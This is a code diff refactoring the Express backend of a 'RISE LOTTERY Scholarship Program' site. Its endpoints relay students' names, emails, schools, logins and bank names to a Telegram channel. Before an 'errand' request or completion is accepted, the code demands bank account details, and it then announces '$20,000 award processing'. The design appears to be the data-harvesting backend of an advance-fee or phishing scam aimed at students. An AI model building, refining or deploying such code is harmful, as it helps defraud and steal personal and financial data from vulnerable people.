+app.post('/api/errand/request', asyncHandler(async (req, res) => {
     const { name, email, schoolName, telegram, whatsapp, preferred, hasAccountDetails } = req.body;
-    console.log('🤝 Errand Request:', req.body);
 
-    try {
-        // Check if account details are provided
-        if (!hasAccountDetails) {
-            console.log('⚠️ Account details missing for errand request:', email);
-            
-            const missingMessage = telegramService.formatAccountDetailsMissing(
-                name || 'Student',
-                email || 'unknown@email.com',
-                schoolName || 'Unknown'
-            );
-            await telegramService.sendWithRetry(missingMessage);
-            
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Account details required',
-                message: 'Please add your bank account details before submitting an errand request.'
-            });
-        }
-
-        // Send errand request notification
-        const message = telegramService.formatErrandRequest(
+    if (!hasAccountDetails) {
+        const missingMessage = telegramService.formatAccountDetailsMissing(
             name || 'Student',
             email || 'unknown@email.com',
-            schoolName || 'Unknown',
-            telegram || 'Not provided',
-            whatsapp || 'Not provided',
-            preferred || 'Not specified'
+            schoolName || 'Unknown'
         );
-        await telegramService.sendWithRetry(message);
-
-        res.json({ 
-            success: true, 
-            message: 'Errand request received. Account details verified.'
-        });
-    } catch (error) {
-        console.error('❌ Errand request error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        await telegramService.sendWithRetry(missingMessage);
+        return sendResponse(res, 400, {}, 'Account details required');
     }
-});
+
+    const message = telegramService.formatErrandRequest(
+        name || 'Student',
+        email || 'unknown@email.com',
+        schoolName || 'Unknown',
+        telegram || 'Not provided',
+        whatsapp || 'Not provided',
+        preferred || 'Not specified'
+    );
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Errand request received');
+}));
 
 // ============================================================
-// UPDATED: Errand completion with account details check
+// ERRAND COMPLETION
 // ============================================================
 
-app.post('/api/errand/complete', async (req, res) => {
+app.post('/api/errand/complete', asyncHandler(async (req, res) => {
     const { name, email, schoolName, hasAccountDetails } = req.body;
-    console.log('✅ Errand Completed:', req.body);
 
-    try {
-        // Verify account details exist
-        if (!hasAccountDetails) {
-            console.log('⚠️ Cannot complete errand - account details missing for:', email);
-            return res.status(400).json({
-                success: false,
-                error: 'Account details required',
-                message: 'Please add your bank account details to receive your funds.'
-            });
-        }
-
-        // Send Telegram notification
-        const message = telegramService.formatErrandCompletion(
-            name || 'Student',
-            email || 'unknown@email.com',
-            schoolName || 'Unknown'
-        );
-        await telegramService.sendWithRetry(message);
-
-        res.json({ 
-            success: true, 
-            message: 'Errand completed. Fund processing started.'
-        });
-    } catch (error) {
-        console.error('❌ Errand completion error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+    if (!hasAccountDetails) {
+        return sendResponse(res, 400, {}, 'Account details required');
     }
-});
 
-// User login notification
-app.post('/api/user/login', async (req, res) => {
+    const message = `✅ <b>✅ ERRAND COMPLETED!</b>
+    
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
+👤 <b>Student:</b> ${name || 'Student'}
+📧 <b>Email:</b> ${email || 'unknown@email.com'}
+🏫 <b>School:</b> ${schoolName || 'Unknown'}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
+
+🎉 <i>Errand verified! $20,000 award processing started</i>
+
+🏆 RISE LOTTERY Scholarship Program`;
+
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Errand completed');
+}));
+
+// ============================================================
+// USER LOGIN NOTIFICATION
+// ============================================================
+
+app.post('/api/user/login', asyncHandler(async (req, res) => {
     const { name, email, schoolName } = req.body;
-    console.log('👤 User Login:', req.body);
 
-    try {
-        const message = telegramService.formatLoginNotification(
-            name || 'Student',
-            email || 'unknown@email.com',
-            schoolName || 'Unknown'
-        );
-        await telegramService.sendWithRetry(message);
+    const message = `🟢 <b>🟢 USER LOGGED IN</b>
+    
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
+👤 <b>Student:</b> ${name || 'Student'}
+📧 <b>Email:</b> ${email || 'unknown@email.com'}
+🏫 <b>School:</b> ${schoolName || 'Unknown'}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 
-        res.json({ success: true, message: 'Login notification sent to Telegram' });
-    } catch (error) {
-        console.error('❌ Login notification error:', error);
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
+👋 <i>User successfully logged in to dashboard</i>
 
-// Account details saved notification
-app.post('/api/account/saved', async (req, res) => {
+🏆 RISE LOTTERY Scholarship Program`;
+
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Login notification sent');
+}));
+
+// ============================================================
+// ACCOUNT DETAILS SAVED NOTIFICATION
+// ============================================================
+
+app.post('/api/account/saved', asyncHandler(async (req, res) => {
     const { name, email, schoolName, bankName } = req.body;
-    console.log('🏦 Account Details Saved:', req.body);
 
-    try {
-        const message = telegramService.formatAccountDetailsSaved(
-            name || 'Student',
-            email || 'unknown@email.com',
-            schoolName || 'Unknown',
-            bankName || 'Not specified'
-        );
-        await telegramService.sendWithRetry(message);
+    const message = `🏦 <b>ACCOUNT DETAILS SAVED</b>
+    
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
+👤 <b>Student:</b> ${name || 'Student'}
+📧 <b>Email:</b> ${email || 'unknown@email.com'}
+🏫 <b>School:</b> ${schoolName || 'Unknown'}
+🏛️ <b>Bank:</b> ${bankName || 'Not specified'}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+📋 <b>━━━━━━━━━━━━━━━━━━━━</b>
 
-        res.json({ success: true, message: 'Account details notification sent to Telegram' });
-    } catch (error) {
-        console.error('❌ Account details notification error:', error);
-        res.status(500).json({ error: 'Internal server error' });
-    }
+✅ <i>Bank account details have been saved</i>
+
+🏆 RISE LOTTERY Scholarship Program`;
+
+    await telegramService.sendWithRetry(message);
+
+    sendResponse(res, 200, {}, 'Account details notification sent');
+}));
+
+// ============================================================
+// 404 HANDLER
+// ============================================================
+
+app.use((req, res) => {
+    sendResponse(res, 404, {}, 'Route not found');
 });
 
 // ============================================================
-// ERROR HANDLING
+// GLOBAL ERROR HANDLER
 // ============================================================
 
 app.use((err, req, res, next) => {
-    console.error('Error:', err.message);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('❌ Error:', err.message);
+    console.error('Stack:', err.stack);
+
+    const status = err.status || 500;
+    const message = process.env.NODE_ENV === 'production' 
+        ? 'Internal server error' 
+        : err.message;
+
+    sendResponse(res, status, {}, message);
 });
+
+// ============================================================
+// GRACEFUL SHUTDOWN
+// ============================================================
+
+let server;
+
+const gracefulShutdown = () => {
+    console.log('🔄 Shutting down gracefully...');
+    otpService.destroy();
+    if (server) {
+        server.close(() => {
+            console.log('✅ Server closed');
+            process.exit(0);
+        });
+    }
+};
+
+process.on('SIGTERM', gracefulShutdown);
+process.on('SIGINT', gracefulShutdown);
 
 // ============================================================
 // START SERVER
@@ -1416,10 +1203,13 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 5000;
 
-app.listen(PORT, () => {
+server = app.listen(PORT, () => {
     console.log(`🚀 RISE LOTTERY Backend running on port ${PORT}`);
     console.log(`📦 Environment: ${process.env.NODE_ENV || 'development'}`);
     console.log(`🔒 Security: ${process.env.NODE_ENV === 'production' ? '🔒 Production' : '🔓 Development'}`);
+    console.log(`📱 Telegram: ${telegramService.enabled ? '✅ Enabled' : '❌ Disabled'}`);
+    console.log(`📧 Email: ${emailService.isConfigured ? '✅ Configured' : '❌ Missing'}`);
+    console.log(`🏫 Schools loaded: ${Object.keys(schoolDatabase).length}`);
 });
 
 module.exports = app;
